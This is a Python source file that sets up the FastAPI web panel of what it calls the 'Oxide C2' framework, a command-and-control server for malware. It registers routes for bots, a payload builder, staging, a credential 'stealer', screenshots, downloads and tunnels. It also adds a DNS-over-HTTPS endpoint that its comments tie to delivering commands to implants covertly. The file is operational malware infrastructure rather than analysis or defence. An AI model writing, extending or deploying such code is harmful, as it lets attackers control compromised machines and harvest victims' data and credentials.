"""FastAPI application factory."""

import logging
import struct
from contextlib import asynccontextmanager
from pathlib import Path

from fastapi import FastAPI, Request
from fastapi.responses import Response as _Resp
from fastapi.staticfiles import StaticFiles

from ..registry import Registry
from ..storage import close_db, init_db
from .events import EventBus, set_event_bus

logger = logging.getLogger(__name__)

WEB_DIR = Path(__file__).parent.parent.parent / "web"
DATA_DIR = Path(__file__).parent.parent.parent.parent / "data"


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan - startup and shutdown."""
    # Startup
    logger.info("FastAPI starting up")
    await init_db()

    # Make event bus globally accessible for handler
    set_event_bus(app.state.event_bus)

    yield

    # Shutdown
    logger.info("FastAPI shutting down")
    await close_db()


def create_app(registry: Registry, event_bus: EventBus) -> FastAPI:
    """Create and configure the FastAPI application."""
    app = FastAPI(
        title="Oxide C2 Panel",
        description="Web interface for Oxide C2 framework",
        version="0.1.0",
        lifespan=lifespan,
    )

    # Store shared state
    app.state.registry = registry
    app.state.event_bus = event_bus

    try:
        from ..crypto import StatelessCrypto
        from ..main import PSK, load_salt
        app.state.stateless_crypto = StatelessCrypto(PSK, load_salt())
    except FileNotFoundError:
        app.state.stateless_crypto = None

    from ..tunnel import TunnelManager
    app.state.tunnel_manager = TunnelManager()

    # Import and include routers
    from .routers import auth, bots, builder, commands, c2, downloads, screenshots, staging, stealer, ws, tunnel

    app.include_router(auth.router)
    app.include_router(bots.router)
    app.include_router(commands.router)
    app.include_router(downloads.router)
    app.include_router(screenshots.router)
    app.include_router(builder.router)
    app.include_router(staging.router)
    app.include_router(stealer.router)
    app.include_router(ws.router)
    app.include_router(c2.router)
    app.include_router(tunnel.router)

    @app.post("/dns-query")
    async def doh_endpoint(request: Request) -> _Resp:
        """RFC 8484 DNS-over-HTTPS endpoint for oxide c2 zone."""
        body = await request.body()
        return _Resp(content=_doh_reply(body), media_type="application/dns-message")

    # Mount static files for web UI; must come after routes so /dns-query is not shadowed
    if WEB_DIR.exists():
        app.mount("/static", StaticFiles(directory=WEB_DIR / "static"), name="static")
        app.mount("/", StaticFiles(directory=WEB_DIR, html=True), name="web")

    # Mount data directory for file serving (downloads, screenshots)
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    app.mount("/data", StaticFiles(directory=DATA_DIR), name="data")

    return app


def _doh_reply(query: bytes) -> bytes:
    if len(query) < 12:
        return query
    qid = query[:2]
    # Parse question section to find end of name
    pos = 12
    while pos < len(query):
        llen = query[pos]
        if llen == 0:
            pos += 1
            break
        pos += 1 + llen
    # NOERROR, ANCOUNT=0; commands are delivered on heartbeat TXT
    hdr = qid + b"\x81\x80" + struct.pack("!HHHH", 1, 0, 0, 0)
    question_end = pos + 4  # name + QTYPE(2) + QCLASS(2)
    question = query[12 : min(question_end, len(query))]
    return hdr + question
